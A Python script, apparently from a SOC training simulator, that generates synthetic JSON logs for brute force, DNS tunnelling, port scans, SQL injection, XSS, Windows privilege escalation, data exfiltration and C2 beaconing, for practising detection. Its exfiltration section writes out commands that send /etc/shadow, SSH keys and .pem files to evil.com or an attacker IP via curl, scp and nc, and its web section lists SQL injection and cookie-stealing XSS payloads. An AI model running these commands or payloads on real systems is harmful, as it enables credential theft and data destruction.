"""
BlueEye SOC Simulator v2 - Master Attack Generator
Simulates 10 attack types across multiple log sources
"""
import json
import random
import string
from datetime import datetime, timedelta
import os

os.makedirs("logs", exist_ok=True)

BASE_TIME = datetime.now() - timedelta(hours=1)

def ts(offset_seconds=0):
    return str(BASE_TIME + timedelta(seconds=offset_seconds))

def rand_ip(private=True):
    if private:
        return f"192.168.{random.randint(1,10)}.{random.randint(2,254)}"
    return f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

# ──────────────────────────────────────────────
# 1. AUTH LOGS: Brute Force + Credential Stuffing
# ──────────────────────────────────────────────
auth_logs = []
attacker_ips = ["45.33.32.156", "198.51.100.14", "203.0.113.99"]
for i in range(50):
    auth_logs.append({
        "timestamp": ts(i * 15),
        "log_source": "linux_auth",
        "event_type": "failed_login",
        "ip": random.choice(attacker_ips),
        "user": random.choice(["admin", "root", "ubuntu", "pi", "test"]),
        "details": "Authentication failure",
        "host": "web-server-01"
    })
# A few successes after brute force (compromise indicator)
for i in range(3):
    auth_logs.append({
        "timestamp": ts(800 + i * 30),
        "log_source": "linux_auth",
        "event_type": "successful_login",
        "ip": attacker_ips[0],
        "user": "admin",
        "details": "Accepted password",
        "host": "web-server-01"
    })

with open("logs/auth_logs.json", "w") as f:
    json.dump(auth_logs, f, indent=2)
print(f"[+] auth_logs.json — {len(auth_logs)} entries")

# ──────────────────────────────────────────────
# 2. DNS LOGS: DNS Tunneling
# ──────────────────────────────────────────────
dns_logs = []
tunnel_ip = "192.168.1.55"
for i in range(60):
    sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(40, 80)))
    dns_logs.append({
        "timestamp": ts(i * 10),
        "log_source": "dns",
        "event_type": "dns_query",
        "domain": f"{sub}.c2domain.net",
        "query_type": random.choice(["TXT", "NULL", "CNAME"]),
        "ip": tunnel_ip,
        "host": "workstation-07"
    })
# Normal queries for contrast
for i in range(20):
    dns_logs.append({
        "timestamp": ts(i * 30 + 5),
        "log_source": "dns",
        "event_type": "dns_query",
        "domain": random.choice(["google.com", "github.com", "microsoft.com", "amazon.com"]),
        "query_type": "A",
        "ip": rand_ip(),
        "host": f"workstation-{random.randint(1,20):02d}"
    })

with open("logs/dns_logs.json", "w") as f:
    json.dump(dns_logs, f, indent=2)
print(f"[+] dns_logs.json — {len(dns_logs)} entries")

# ──────────────────────────────────────────────
# 3. NETWORK LOGS: Port Scan + Lateral Movement
# ──────────────────────────────────────────────
network_logs = []
scanner_ip = "10.10.10.99"
ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5985, 8080, 8443]
for i, port in enumerate(ports * 2):
    network_logs.append({
        "timestamp": ts(i * 4),
        "log_source": "firewall",
        "event_type": "port_scan",
        "src_ip": scanner_ip,
        "dst_ip": f"192.168.1.{random.randint(1, 50)}",
        "port": port,
        "protocol": "TCP",
        "action": "DENY",
        "details": f"SYN probe port {port}"
    })

with open("logs/network_logs.json", "w") as f:
    json.dump(network_logs, f, indent=2)
print(f"[+] network_logs.json — {len(network_logs)} entries")

# ──────────────────────────────────────────────
# 4. WEB LOGS: SQL Injection + XSS
# ──────────────────────────────────────────────
web_logs = []
sqli_payloads = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT null,null--",
    "1'; DROP TABLE users--", "' OR SLEEP(5)--"
]
xss_payloads = [
    "<script>alert(1)</script>", "<img src=x onerror=alert('XSS')>",
    "javascript:alert(document.cookie)", "<svg onload=alert(1)>"
]
web_attacker = "91.108.4.200"

for i, payload in enumerate(sqli_payloads * 3):
    web_logs.append({
        "timestamp": ts(i * 20),
        "log_source": "web_server",
        "event_type": "sql_injection",
        "ip": web_attacker,
        "method": "POST",
        "uri": "/login",
        "payload": payload,
        "status_code": random.choice([200, 401, 500]),
        "user_agent": "sqlmap/1.7.8",
        "host": "web-app-01"
    })

for i, payload in enumerate(xss_payloads * 2):
    web_logs.append({
        "timestamp": ts(i * 25 + 200),
        "log_source": "web_server",
        "event_type": "xss_attempt",
        "ip": "185.220.101.47",
        "method": "GET",
        "uri": f"/search?q={payload}",
        "payload": payload,
        "status_code": 200,
        "user_agent": "Mozilla/5.0",
        "host": "web-app-01"
    })

with open("logs/web_logs.json", "w") as f:
    json.dump(web_logs, f, indent=2)
print(f"[+] web_logs.json — {len(web_logs)} entries")

# ──────────────────────────────────────────────
# 5. WINDOWS LOGS: Privilege Escalation + Lateral Movement
# ──────────────────────────────────────────────
windows_logs = []
priv_esc_events = [
    {"event_id": 4688, "details": "New process: whoami /priv", "process": "whoami.exe"},
    {"event_id": 4688, "details": "New process: net localgroup administrators", "process": "net.exe"},
    {"event_id": 4672, "details": "Special privileges assigned to new logon", "process": "lsass.exe"},
    {"event_id": 4624, "details": "Logon Type 3: Network logon from unusual IP", "process": "winlogon.exe"},
    {"event_id": 4698, "details": "Scheduled task created: SysUpdate", "process": "taskschd.msc"},
    {"event_id": 7045, "details": "New service installed: RemoteAdmin", "process": "services.exe"},
    {"event_id": 4688, "details": "New process: mimikatz.exe", "process": "mimikatz.exe"},
    {"event_id": 4648, "details": "Explicit credential logon attempt", "process": "runas.exe"},
]
compromised_ip = attacker_ips[0]
for i, event in enumerate(priv_esc_events):
    windows_logs.append({
        "timestamp": ts(850 + i * 60),
        "log_source": "windows_security",
        "event_type": "privilege_escalation",
        "event_id": event["event_id"],
        "ip": compromised_ip,
        "user": "admin",
        "process": event["process"],
        "details": event["details"],
        "host": "DC-01"
    })

with open("logs/windows_logs.json", "w") as f:
    json.dump(windows_logs, f, indent=2)
print(f"[+] windows_logs.json — {len(windows_logs)} entries")

# ──────────────────────────────────────────────
# 6. LINUX LOGS: Data Exfiltration
# ──────────────────────────────────────────────
linux_logs = []
exfil_cmds = [
    "tar czf /tmp/.hidden_archive.tgz /etc /home",
    "curl -X POST https://evil.com/upload -F 'data=@/etc/passwd'",
    "scp -P 2222 /home/admin/.ssh/id_rsa attacker@45.33.32.156:/tmp/",
    "python3 -c 'import socket; s=socket.socket(); s.connect((\"45.33.32.156\",4444))'",
    "base64 /etc/shadow | curl -d @- https://evil.com/collect",
    "find / -name '*.pem' -exec cat {} \\; | nc 45.33.32.156 9999"
]
for i, cmd in enumerate(exfil_cmds):
    linux_logs.append({
        "timestamp": ts(900 + i * 45),
        "log_source": "linux_bash",
        "event_type": "data_exfiltration",
        "ip": compromised_ip,
        "user": "admin",
        "command": cmd,
        "details": "Suspicious outbound data transfer",
        "host": "web-server-01"
    })

with open("logs/linux_logs.json", "w") as f:
    json.dump(linux_logs, f, indent=2)
print(f"[+] linux_logs.json — {len(linux_logs)} entries")

# ──────────────────────────────────────────────
# 7. FIREWALL LOGS: Ransomware C2 Beaconing
# ──────────────────────────────────────────────
firewall_logs = []
c2_domains = ["45.33.32.156", "198.51.100.200", "203.0.113.77"]
beacon_host = "workstation-03"
for i in range(30):
    firewall_logs.append({
        "timestamp": ts(i * 120),     # every 2 mins — classic beacon interval
        "log_source": "firewall",
        "event_type": "c2_beaconing",
        "src_ip": "192.168.1.30",
        "dst_ip": random.choice(c2_domains),
        "dst_port": random.choice([443, 80, 8443]),
        "bytes_out": random.randint(200, 800),
        "bytes_in": random.randint(50, 200),
        "protocol": "HTTPS",
        "host": beacon_host,
        "details": "Regular interval outbound connection to known C2"
    })

with open("logs/firewall_logs.json", "w") as f:
    json.dump(firewall_logs, f, indent=2)
print(f"[+] firewall_logs.json — {len(firewall_logs)} entries")

print("\n✅ All log files generated successfully in /logs/")
